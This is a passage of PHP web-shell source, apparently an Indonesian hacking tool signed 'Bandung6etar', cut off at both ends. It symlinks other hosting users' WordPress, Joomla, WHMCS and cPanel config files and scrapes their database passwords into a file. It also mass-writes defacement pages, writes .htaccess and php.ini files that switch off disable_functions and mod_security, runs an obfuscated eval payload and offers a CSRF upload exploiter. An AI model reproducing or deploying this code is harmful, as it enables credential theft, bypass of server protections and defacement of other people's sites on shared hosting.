@symlink('/home10/'.$user.'/public_html/inc/conf_global.php',$user.'-IPB.txt');
@symlink('/home10/'.$user.'/public_html/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home10/'.$user.'/public_html/wp/test/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home10/'.$user.'/public_html/blog/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home10/'.$user.'/public_html/beta/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home10/'.$user.'/public_html/portal/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home10/'.$user.'/public_html/site/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home10/'.$user.'/public_html/wp/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home10/'.$user.'/public_html/WP/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home10/'.$user.'/public_html/news/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home10/'.$user.'/public_html/wordpress/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home10/'.$user.'/public_html/test/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home10/'.$user.'/public_html/demo/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home10/'.$user.'/public_html/home/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home10/'.$user.'/public_html/v1/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home10/'.$user.'/public_html/v2/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home10/'.$user.'/public_html/press/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home10/'.$user.'/public_html/new/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home10/'.$user.'/public_html/blogs/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home10/'.$user.'/public_html/configuration.php',$user.'-Joomla.txt');
@symlink('/home10/'.$user.'/public_html/blog/configuration.php',$user.'-Joomla.txt');
@symlink('/home10/'.$user.'/public_html/submitticket.php',$user.'-^WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/cms/configuration.php',$user.'-Joomla.txt');
@symlink('/home10/'.$user.'/public_html/beta/configuration.php',$user.'-Joomla.txt');
@symlink('/home10/'.$user.'/public_html/portal/configuration.php',$user.'-Joomla.txt');
@symlink('/home10/'.$user.'/public_html/site/configuration.php',$user.'-Joomla.txt');
@symlink('/home10/'.$user.'/public_html/main/configuration.php',$user.'-Joomla.txt');
@symlink('/home10/'.$user.'/public_html/home/configuration.php',$user.'-Joomla.txt');
@symlink('/home10/'.$user.'/public_html/demo/configuration.php',$user.'-Joomla.txt');
@symlink('/home10/'.$user.'/public_html/test/configuration.php',$user.'-Joomla.txt');
@symlink('/home10/'.$user.'/public_html/v1/configuration.php',$user.'-Joomla.txt');
@symlink('/home10/'.$user.'/public_html/v2/configuration.php',$user.'-Joomla.txt');
@symlink('/home10/'.$user.'/public_html/joomla/configuration.php',$user.'-Joomla.txt');
@symlink('/home10/'.$user.'/public_html/new/configuration.php',$user.'-Joomla.txt');
@symlink('/home10/'.$user.'/public_html/WHMCS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/whmcs1/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/Whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/WHMC/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/Whmc/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/whmc/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/WHM/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/Whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/HOST/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/Host/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/host/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/SUPPORTES/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/Supportes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/supportes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/domains/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/domain/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/Hosting/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/HOSTING/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/hosting/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/CART/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/Cart/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/cart/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/ORDER/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/Order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/CLIENT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/Client/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/client/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/CLIENTAREA/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/Clientarea/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/clientarea/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/SUPPORT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/Support/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/support/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/BILLING/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/Billing/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/billing/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/BUY/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/Buy/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/buy/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/MANAGE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/Manage/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/manage/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/CLIENTSUPPORT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/ClientSupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/Clientsupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/clientsupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/CHECKOUT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/Checkout/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/checkout/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/BASKET/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/Basket/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/basket/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/SECURE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/Secure/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/secure/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/SALES/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/Sales/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/sales/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/BILL/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/Bill/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/bill/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/PURCHASE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/Purchase/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/purchase/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/ACCOUNT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/Account/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/account/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/USER/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/User/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/user/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/CLIENTS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/Clients/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/clients/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/MY/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/My/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/my/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/secure/whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/secure/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/panel/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/clientes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/cliente/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/support/order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home10/'.$user.'/public_html/boxbilling/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home10/'.$user.'/public_html/box/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home10/'.$user.'/public_html/host/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home10/'.$user.'/public_html/Host/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home10/'.$user.'/public_html/supportes/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home10/'.$user.'/public_html/support/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home10/'.$user.'/public_html/hosting/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home10/'.$user.'/public_html/cart/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home10/'.$user.'/public_html/order/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home10/'.$user.'/public_html/client/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home10/'.$user.'/public_html/clients/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home10/'.$user.'/public_html/cliente/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home10/'.$user.'/public_html/clientes/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home10/'.$user.'/public_html/billing/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home10/'.$user.'/public_html/billings/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home10/'.$user.'/public_html/my/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home10/'.$user.'/public_html/secure/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home10/'.$user.'/public_html/support/order/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home10/'.$user.'/public_html/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home10/'.$user.'/public_html/zencart/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home10/'.$user.'/public_html/products/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home10/'.$user.'/public_html/cart/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home10/'.$user.'/public_html/shop/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home10/'.$user.'/public_html/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home10/'.$user.'/public_html/hostbills/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home10/'.$user.'/public_html/host/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home10/'.$user.'/public_html/Host/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home10/'.$user.'/public_html/supportes/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home10/'.$user.'/public_html/support/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home10/'.$user.'/public_html/hosting/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home10/'.$user.'/public_html/cart/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home10/'.$user.'/public_html/order/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home10/'.$user.'/public_html/client/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home10/'.$user.'/public_html/clients/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home10/'.$user.'/public_html/cliente/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home10/'.$user.'/public_html/clientes/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home10/'.$user.'/public_html/billing/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home10/'.$user.'/public_html/billings/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home10/'.$user.'/public_html/my/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home10/'.$user.'/public_html/secure/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home10/'.$user.'/public_html/support/order/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home10/'.$user.'/.my.cnf',$user.'-Cpanel.txt');
@symlink('/home10/'.$user.'/public_html/po-content/config.php',$user.'-Popoji.txt');
}

//password grab

function entre2v2($text,$marqueurDebutLien,$marqueurFinLien)
{

$ar0=explode($marqueurDebutLien, $text);
$ar1=explode($marqueurFinLien, $ar0[1]);
$ar=trim($ar1[0]);
return $ar;
}

$ffile=fopen('Passwords.txt','a+');


$r= 'http://'.$_SERVER['SERVER_NAME'].dirname($_SERVER['SCRIPT_NAME'])."/ltf_symconf/";
$re=$r;
$confi=array("-Wordpress.txt","-Joomla.txt","-WHMCS.txt","-Vbulletin.txt","-Other.txt","-Zencart.txt","-Hostbills.txt","-SMF.txt","-Drupal.txt","-OsCommerce.txt","-MyBB.txt","-PHPBB.txt","-IPB.txt","-BoxBilling.txt");

$users=file("/etc/passwd");
foreach($users as $user)
{

$str=explode(":",$user);
$usersss=$str[0];
foreach($confi as $co)
{


$uurl=$re.$usersss.$co;
$uel=$uurl;

$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, $uel);
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.8) Gecko/2009032609 Firefox/3.0.8');
$result['EXE'] = curl_exec($ch);
curl_close($ch);
$uxl=$result['EXE'];


if($uxl && preg_match('/table_prefix/i',$uxl))
{

//Wordpress

$dbp=entre2v2($uxl,"DB_PASSWORD', '","');");
if(!empty($dbp))
$pass=$dbp."\n";
fwrite($ffile,$pass);

}
elseif($uxl && preg_match('/cc_encryption_hash/i',$uxl))
{

//WHMCS

$dbp=entre2v2($uxl,"db_password = '","';");
if(!empty($dbp))
$pass=$dbp."\n";
fwrite($ffile,$pass);

}


elseif($uxl && preg_match('/dbprefix/i',$uxl))
{

//Joomla

$db=entre2v2($uxl,"password = '","';");
if(!empty($db))
$pass=$db."\n";
fwrite($ffile,$pass);
}
elseif($uxl && preg_match('/admincpdir/i',$uxl))
{

//Vbulletin

$db=entre2v2($uxl,"password'] = '","';");
if(!empty($db))
$pass=$db."\n";
fwrite($ffile,$pass);

}
elseif($uxl && preg_match('/DB_DATABASE/i',$uxl))
{

//Other

$db=entre2v2($uxl,"DB_PASSWORD', '","');");
if(!empty($db))
$pass=$db."\n";
fwrite($ffile,$pass);
}
elseif($uxl && preg_match('/dbpass/i',$uxl))
{

//Other

$db=entre2v2($uxl,"dbpass = '","';");
if(!empty($db))
$pass=$db."\n";
fwrite($ffile,$pass);
}
elseif($uxl && preg_match('/dbpass/i',$uxl))
{

//Other

$db=entre2v2($uxl,"dbpass = '","';");
if(!empty($db))
$pass=$db."\n";
fwrite($ffile,$pass);

}
elseif($uxl && preg_match('/dbpass/i',$uxl))
{

//Other

$db=entre2v2($uxl,"dbpass = \"","\";");
if(!empty($db))
$pass=$db."\n";
fwrite($ffile,$pass);
}


}
}
echo "<center>
<a href=\"ltf_symconf/root/\">Root Server</a>
<br><a href=\"ltf_symconf/Passwords.txt\">Passwords</a>
<br><a href=\"ltf_symconf/\">Configurations</a></center>";
}
else
{
echo "<center>
<form method=\"POST\">
<textarea name=\"passwd\" class='area' rows='15' cols='60'>";
$file = '/etc/passwd';
$read = @fopen($file, 'r');
if ($read){
$body = @fread($read, @filesize($file));
echo "".htmlentities($body)."";
}
elseif(!$read)
{
$read = @show_source($file) ;
}
elseif(!$read)
{
$read = @highlight_file($file);
}
elseif(!$read)
{
for($uid=0;$uid<1000;$uid++)
{
$ara = posix_getpwuid($uid);
if (!empty($ara))
{
while (list ($key, $val) = each($ara))
{
print "$val:";
}
print "\n";
}}}

flush();
 
echo "</textarea>
<p><input name=\"m\" size=\"80\" value=\"Start\" type=\"submit\"/></p>
</form></center>";
}
}
} elseif($_GET['to'] == 'mass') {
	function sabun_massal($dir,$namafile,$isi_script) {
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				$dirc = "$dir/$dirb";
				$lokasi = $dirc.'/'.$namafile;
				if($dirb === '.') {
					file_put_contents($lokasi, $isi_script);
				} elseif($dirb === '..') {
					file_put_contents($lokasi, $isi_script);
				} else {
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							echo "[<font color=lime>BERHASIL</font>] $lokasi<br>";
							file_put_contents($lokasi, $isi_script);
							$idx = sabun_massal($dirc,$namafile,$isi_script);
						}
					}
				}
			}
		}
	}
	function sabun_biasa($dir,$namafile,$isi_script) {
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				$dirc = "$dir/$dirb";
				$lokasi = $dirc.'/'.$namafile;
				if($dirb === '.') {
					file_put_contents($lokasi, $isi_script);
				} elseif($dirb === '..') {
					file_put_contents($lokasi, $isi_script);
				} else {
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							echo "[<font color=lime>BERHASIL</font>] $dirb/$namafile<br>";
							file_put_contents($lokasi, $isi_script);
						}
					}
				}
			}
		}
	}
	if($_POST['start']) {
		if($_POST['tipe_sabun'] == 'mahal') {
			echo "<div style='margin: 5px auto; padding: 5px'>";
			sabun_massal($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
			echo "</div>";
		} elseif($_POST['tipe_sabun'] == 'murah') {
			echo "<div style='margin: 5px auto; padding: 5px'>";
			sabun_biasa($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
			echo "</div>";
		}
	} else {
	echo "<center>";
	echo "<form method='post'>
	<font style='text-decoration: underline;'>Tipe Mass:</font><br>
	<input type='radio' name='tipe_sabun' value='murah' checked>Biasa<input type='radio' name='tipe_sabun' value='mahal'>Luar Biasa<br>
	<font style='text-decoration: underline;'>Folder:</font><br>
	<input type='text' name='d_dir' value='$dir' style='width: 450px;' height='10'><br>
	<font style='text-decoration: underline;'>Nama File:</font><br>
	<input type='text' name='d_file' value='6etar.php' style='width: 450px;' height='10'><br>
	<font style='text-decoration: underline;'>Index Filenya:</font><br>
	<textarea name='script' style='width: 450px; height: 200px;'>Hacked By Bandung6etar</textarea><br>
	<input type='submit' name='start' value='MASSAL !!' style='width: 450px;'>
	</form></center>";
	} 
	} elseif($_GET['to'] == 'vhost') {
	echo "<form method='POST' action=''>";
	echo "<center><br><font size='6'>Bypass Symlink vHost</font><br><br>";
	echo "<center><input type='submit' value='Bypass it' name='Colii'></center>";
	if (isset($_POST['Colii'])){ system('ln -s / Rintoar.txt');
	$fvckem ='T3B0aW9ucyBJbmRleGVzIEZvbGxvd1N5bUxpbmtzDQpEaXJlY3RvcnlJbmRleCBzc3Nzc3MuaHRtDQpBZGRUeXBlIHR4dCAucGhwDQpBZGRIYW5kbGVyIHR4dCAucGhw';
	$file = fopen(".htaccess","w+"); $write = fwrite ($file ,base64_decode($fvckem)); $Bok3p = symlink("/","Rintoar.txt");
	$rt="<br><a href=Rintoar.txt TARGET='_blank'><font color=#ff0000 size=2 face='Courier New'><b>
	Bypassed Berhasil!!</b></font></a>";
	echo "<br><br><b>Done.. !</b><br><br>Check link given below for / folder symlink <br>$rt</center>";} echo "</form>";
	} elseif($_GET['to'] == 'csrfup')
	{	
	echo '<html>
	<center><h1 style="font-size:33px;">CSRF EXPLOITERt<br>Bandung6etar</h1><br><br>
	<font size="3">*Note : Post File, Type : Filedata / dzupload / dzfile / dzfiles / file / ajaxfup / files[] / qqfile / userfile / etc</font>
	<br><br>
	<form method="post" style="font-size:25px;">
	URL: <input type="text" name="url" size="50" height="10" placeholder="http://www.target.com/path/upload.php" style="margin: 5px auto; padding-left: 5px;" required><br>
	POST File: <input type="text" name="pf" size="50" height="10" placeholder="Lihat diatas ^" style="margin: 5px auto; padding-left: 5px;" required><br>
	<input type="submit" name="d" value="KUNCI">
	</form>';
	$url = $_POST["url"];
	$pf = $_POST["pf"];
	$d = $_POST["d"];
	if($d) {
	echo "<form method='post' target='_blank' action='$url' enctype='multipart/form-data'><input type='file' name='$pf'><input type='submit' name='g' value='Upload'></form></form>
	</html>";
	}
	} elseif($_GET['to'] == 'hashid') {
	if (isset($_POST['gethash'])) {
	$hash = $_POST['hash'];
	if (strlen($hash) == 32) {
	$hashresult = "MD5 Hash";
	} elseif (strlen($hash) == 40) {
	$hashresult = "SHA-1 Hash/ /MySQL5 Hash";
	} elseif (strlen($hash) == 13) {
	$hashresult = "DES(Unix) Hash";
	} elseif (strlen($hash) == 16) {
	$hashresult = "MySQL Hash / /DES(Oracle Hash)";
	} elseif (strlen($hash) == 41) {
	$GetHashChar = substr($hash, 40);
	if ($GetHashChar == "*") {
	$hashresult = "MySQL5 Hash";
	}
	} elseif (strlen($hash) == 64) {
	$hashresult = "SHA-256 Hash";
	} elseif (strlen($hash) == 96) {
	$hashresult = "SHA-384 Hash";
	} elseif (strlen($hash) == 128) {
	$hashresult = "SHA-512 Hash";
	} elseif (strlen($hash) == 34) {
	if (strstr($hash, '$1$')) {
	$hashresult = "MD5(Unix) Hash";
	}
	} elseif (strlen($hash) == 37) {
	if (strstr($hash, '$apr1$')) {
	$hashresult = "MD5(APR) Hash";
	}
	} elseif (strlen($hash) == 34) {
	if (strstr($hash, '$H$')) {
	$hashresult = "MD5(phpBB3) Hash";
	}
	} elseif (strlen($hash) == 34) {
	if (strstr($hash, '$P$')) {
	$hashresult = "MD5(Wordpress) Hash";
	}
	} elseif (strlen($hash) == 39) {
	if (strstr($hash, '$5$')) {
	$hashresult = "SHA-256(Unix) Hash";
	}
	} elseif (strlen($hash) == 39) {
	if (strstr($hash, '$6$')) {
	$hashresult = "SHA-512(Unix) Hash";
	}
	} elseif (strlen($hash) == 24) {
	if (strstr($hash, '==')) {
	$hashresult = "MD5(Base-64) Hash";
	}
	} else {
	$hashresult = "Hash type not found";
	}
	} else {
	$hashresult = "Not Hash Entered";
	}
	?>
	<center><br><Br><br>
	
	<form action="" method="POST">
	<tr>
	<table >
	<th colspan="5">Hash Identification</th>
	<tr class="optionstr"><B><td>Enter Hash</td></b><td>:</td>	<td><input type="text" name="hash" size='60' class="inputz" /></td><td><input type="submit" class="inputzbut" name="gethash" value="Identify Hash" /></td></tr>
	<tr class="optionstr"><b><td>Result</td><td>:</td><td><?php echo $hashresult; ?></td></tr></b>
	</table></tr></form>
	</center>
	<?php
} elseif($_GET['to'] == 'domains'){echo "<center><div class='mybox'><p align='center' class='cgx2'>Domains and Users</p>";$d0mains = @file("/etc/named.conf");if(!$d0mains){die("<center>Error : can't read [ /etc/named.conf ]</center>");}echo '<table id="output"><tr bgcolor=#cecece><td>Domains</td><td>users</td></tr>';foreach($d0mains as $d0main){if(eregi("zone",$d0main)){preg_match_all('#zone "(.*)"#', $d0main, $domains);flush();if(strlen(trim($domains[1][0])) > 2){$user = posix_getpwuid(@fileowner("/etc/valiases/".$domains[1][0]));echo "<tr><td><a href=http://www.".$domains[1][0]."/>".$domains[1][0]."</a></td><td>".$user['name']."</td></tr>";flush();}}}echo'</div></center>';
} elseif($_GET['to'] == 'disablefunc'){
		echo "<center>";
		echo "<form method=post><input type=submit name=ini value='php.ini' />&nbsp;<input type=submit name=htce value='.htaccess' /></form>";
		if(isset($_POST['ini']))
{
		$file = fopen("php.ini","w");
		echo fwrite($file,"disable_functions=none
safe_mode = Off
	");
		fclose($file);
		echo "<a href='php.ini'>click here!</a>";
}		if(isset($_POST['htce']))
{
		$file = fopen(".htaccess","w");
		echo fwrite($file,"<IfModule mod_security.c>
SecFilterEngine Off
SecFilterScanPOST Off
</IfModule>
	");
		fclose($file);
		echo "htaccess successfully created!";
}
		echo"</center>";
}elseif($_GET['to'] == 'sym') {
echo '<hr>'; eval(gzuncompress(base64_decode(str_rot13('rWkyHAgdt0ND/MIOWXitcFx0gOUoulXxG03I9PKVLaIfOBAh3MRxuCk7I02ucGNCZ2p4ykyGqbWRVEbVjndIDeWZaxGkrkEi2FcA1jaYoWwA4O8XLEtPRl2m4DaLwxtdOfhcLjTLsGqbTzsmk+Tl9C3mKkz+rx1Fyy1+jKU0gbzFyT/vS70jNdwdOixaRv9RF9vFfxLYYKL39ko33amk4A3Bo/kPXH/hWUBtluhSQvwdZA9CgXBz64aD2y4GDitVD495vq04Tp+GtHfavHiVcJmdVdqngC7ECEjBovJ6iniCjeLDWMnTN2lCgOCyFTse4EnAKKBB4TQSC/d6XsyKw93W2wYEx+la7sPwmULt02KojGpJ3U0d'))));
} elseif($_GET['to'] == 'jumping') {
	$i = 0;
	echo "<div class='margin: 5px auto;'>";
	if(preg_match("/hsphere/", $dir)) {
	$urls = explode("\r\n", $_POST['url']);
	if(isset($_POST['jump'])) {
	echo "<pre>";
	foreach($urls as $url) {
	$url = str_replace(array("http://","www."), "", strtolower($url));
	$etc = "/etc/passwd";
	$f = fopen($etc,"r");
	while($gets = fgets($f)) {
	$pecah = explode(":", $gets);
	$user = $pecah[0];
	$dir_user = "/hsphere/local/home/$user";
	if(is_dir($dir_user) === true) {
	$url_user = $dir_user."/".$url;
	if(is_r
